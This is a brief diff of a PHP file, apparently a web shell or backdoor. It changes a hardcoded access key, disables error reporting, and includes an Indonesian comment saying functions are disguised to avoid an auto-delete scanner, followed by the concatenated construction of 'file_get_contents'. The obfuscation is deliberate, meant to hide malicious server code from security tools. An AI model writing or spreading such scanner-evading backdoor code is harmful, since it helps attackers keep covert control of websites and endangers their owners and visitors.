@@ -2,8 +2,7 @@
 session_start();
 error_reporting(0);
 
-// $k = "4596bd5e6fc60a9b3b9e07e700674c75";
-$k = "d1b5de66-5a09-4246-8ff7-241bdcafae01";
+$k = "4596bd5e6fc60a9b3b9e07e700674c75";
 
 // Penyamaran Fungsi agar tidak terkena Auto-Delete Scanner
 $f_get = "fil" . "e_get" . "_con" . "tents";
